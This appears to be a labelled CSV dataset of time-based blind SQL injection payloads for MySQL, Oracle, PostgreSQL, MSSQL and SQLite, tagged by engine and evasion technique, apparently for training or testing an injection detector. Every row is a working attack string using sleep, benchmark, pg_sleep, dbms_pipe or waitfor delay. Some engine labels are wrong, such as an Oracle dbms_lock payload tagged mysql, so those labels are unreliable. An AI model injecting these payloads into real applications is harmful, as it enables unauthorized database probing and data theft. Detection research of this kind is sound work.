payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1"" ) where 1673 = 1673 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1'+ ( select 'zirh' where 9054 = 9054 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) ) +'",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1'|| ( select 'cjwp' where 8681 = 8681 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) ||'",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
select pg_sleep ( 5 ) and ( ( ( 'xobx' = 'xobx,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 'ffzv' = 'ffzv",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) where 7165 = 7165 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 'nond' = 'nond",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ""xeki"" like ""xeki",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
1'+ ( select 'nlvq' where 7528 = 7528 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""gydr"" like ""gydr",time_blind,oracle,case_variation|function_alternative,0.51,rule,sqliv2_csv,unknown
1 or sleep ( 5 ) # tdgb,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" and sleep ( 5 ) and ""tdid"" like ""tdid",time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
1' ) ) as kdse where 6767 = 6767 rlike sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1 ) ) as cusv where 4871 = 4871 and elt ( 1210 = 1210,sleep ( 5 ) ) --",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1'+ ( select kqac where 4362 = 4362 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
1 ) as cwsi where 7360 = 7360 or sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1%' or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" where 3678 = 3678 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
1' ) as xiqw where 8507 = 8507 rlike sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1'+ ( select 'arzm' where 6464 = 6464 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) +'",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( 'hhlq' like 'hhlq,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( ""epfg"" like ""epfg",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) )",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 8898 = 8898",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""%"" = """,time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
1 where 6223 = 6223 rlike sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1%"" ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ""%"" = """,time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
( select ( case when ( 9856 = 9856 ) then sleep ( 5 ) else 9856* ( select 9856 from information_schema.character_sets ) end ) ),time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 'xwhi' = 'xwhi",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'prjf' = 'prjf,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
1' ) as jdmh where 6175 = 6175 rlike sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( 'dcys' like 'dcys,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
1' ) as qcse where 4147 = 4147 waitfor delay '0:0:5'--,time_blind,mssql,,0.41,rule,sqliv2_csv,string_single_quote
1' ) as inid where 7812 = 7812 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
waitfor delay '0:0:5' and ( ( 'nvqf' = 'nvqf,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( '%' = '",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
1 ) ) and sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
select pg_sleep ( 5 ) -- ojzt,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
begin dbms_lock.sleep ( 5 ),time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%' ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1' ) where 2208 = 2208 rlike sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and 'gkku' like 'gkku",time_blind,oracle,function_alternative,0.46,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and 'gfpd' = 'gfpd",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) as gdcx where 2335 = 2335 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1"" rlike sleep ( 5 ) and ""veub"" = ""veub",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
waitfor delay '0:0:5' and 'dfzn' = 'dfzn,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( ""enfu"" = ""enfu",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ""vjlr"" like ""vjlr",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"1 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( 1915 = 1915",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' ) ) as dcen where 5852 = 5852 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1' ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( 'xwsb' = 'xwsb",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' ) as wpom where 2620 = 2620 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ""wsmz"" like ""wsmz",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
1' ) as ncou where 9166 = 9166 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1'+ ( select ophz where 9158 = 9158 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) +',time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1 ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1 ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 7079 = 7079,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 6051 = 6051",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( ""%"" = """,time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and '%' = '",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"1'+ ( select rdpe where 6553 = 6553 or elt ( 6272 = 6272,sleep ( 5 ) ) ) +'",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'atvu' = 'atvu",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
"1%"" and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""fpkm"" like ""fpkm",time_blind,oracle,function_alternative,0.46,rule,sqliv2_csv,unknown
"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'vxqs' = 'vxqs",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1"" ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( ""zgoy"" like ""zgoy",time_blind,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1'+ ( select ttae where 4601 = 4601 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) +'",time_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""aixs"" = ""aixs",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) -- ybmz,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1' ) ) as qgyz where 1547 = 1547 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"select sleep ( 5 ) and ( ( ( ""%"" = """,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1 ) as hlcn where 1165 = 1165 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1%' ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ""hgds"" like ""hgds",time_blind,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",time_blind,mssql,function_alternative,0.46,rule,sqliv2_csv,unknown
"1 ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1%"" ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) as fkgs where 5948 = 5948 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1%' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) )",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) as rgod where 5766 = 5766 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
1' waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
select pg_sleep ( 5 ) and ( ( ( '%' = ',time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""qkds"" like ""qkds",time_blind,mysql,function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) as wsyv where 8142 = 8142 rlike sleep ( 5 ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1'|| ( select 'vekn' from dual where 4929 = 4929 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) ||'",time_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'cqwz' like 'cqwz,time_blind,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
1%' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and '%' = ',time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"select pg_sleep ( 5 ) and ( ""pjql"" like ""pjql",time_blind,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( 'acdu' = 'acdu",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'lqsa' like 'lqsa,time_blind,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1%' ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1 where 8921 = 8921 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( 'labj' = 'labj,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) or sleep ( 5 ) and ( ( ( ""eran"" = ""eran",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1'|| ( select 'oxas' from dual where 8284 = 8284 or sleep ( 5 ) ) ||',time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1' in boolean mode ) waitfor delay '0:0:5'#,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
select pg_sleep ( 5 ) and ( 'aydg' = 'aydg,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( '%' = '",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
1' ) ) as xqvq where 4816 = 4816 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
1'+ ( select echl where 6593 = 6593 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1%"" ) ) rlike sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%' ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1' ) as gsjr where 7046 = 7046 and sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1' in boolean mode ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1'+ ( select ahyw where 6893 = 6893 waitfor delay '0:0:5'--,time_blind,mssql,case_variation,0.41,rule,sqliv2_csv,string_single_quote
select pg_sleep ( 5 ) and ( 'vnss' like 'vnss,time_blind,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'nsji' = 'nsji",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1' ) rlike sleep ( 5 ) and ( 'tslp' = 'tslp,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""zvew"" like ""zvew",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( ( 'keoy' = 'keoy,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ""dyoe"" = ""dyoe",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1%' ) or sleep ( 5 ) and ( '%' = ',time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%' ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%"" and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%"" and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ""%"" = """,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1'|| ( select 'vuku' where 3143 = 3143 waitfor delay '0:0:5'--,time_blind,mssql,case_variation,0.41,rule,sqliv2_csv,string_single_quote
select pg_sleep ( 5 ) # pjvi,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' in boolean mode ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'pwuy' = 'pwuy",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
"1%"" ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ""%"" = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1 ) where 1513 = 1513 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1%"" or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' ) as jrqh where 6204 = 6204 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ""%"" = """,time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
1' ) or sleep ( 5 ) and ( 'mdmr' like 'mdmr,time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""staz"" like ""staz",time_blind,oracle,function_alternative,0.46,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( '%' = ',time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 'ayol' = 'ayol,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'cwuy' = 'cwuy",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
1 ) ) or sleep ( 5 ) and ( ( 8285 = 8285,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( ""ipqw"" like ""ipqw",time_blind,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1 or elt ( 6272 = 6272,sleep ( 5 ) ) -- ilfc",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" where 3227 = 3227 waitfor delay '0:0:5'--",time_blind,mssql,,0.41,rule,sqliv2_csv,string_single_quote
1 ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'jueq' = 'jueq",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1' and sleep ( 5 ) and 'usgv' like 'usgv,time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
waitfor delay '0:0:5' and ( ( ( '%' = ',time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
1'|| ( select 'miew' where 8360 = 8360 waitfor delay '0:0:5' ) ||',time_blind,mssql,case_variation,0.41,rule,sqliv2_csv,unknown
1' where 2547 = 2547 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( ( '%' = ',time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1' ) ) or sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1 ) or sleep ( 5 ),time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' rlike sleep ( 5 ) and 'cugs' = 'cugs,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1 where 7224 = 7224 and sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1' rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and 'mabd' = 'mabd,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ""kfps"" = ""kfps",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1'+ ( select 'jtvq' where 8288 = 8288 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1'+ ( select 'uijv' where 7279 = 7279 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
1 ) where 2734 = 2734 waitfor delay '0:0:5'--,time_blind,mssql,,0.41,rule,sqliv2_csv,string_single_quote
1 ) ) as sipp where 1999 = 1999 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1"" ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""ikaf"" like ""ikaf",time_blind,sqlite,function_alternative,0.53,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 70 ) ||chr ( 106 ) ||chr ( 78 ) ,5 ) from dual--",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
1 ) ) as msug where 3503 = 3503 and sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" ) where 2656 = 2656 or sleep ( 5 ) --",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"select sleep ( 5 ) and ( ""%"" = """,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1' ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 6786 = 6786",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) ) as lmsl where 3753 = 3753 or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( ""hxgu"" = ""hxgu",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( ( 'srfc' like 'srfc,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
1 ) waitfor delay '0:0:5' and ( 2993 = 2993,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
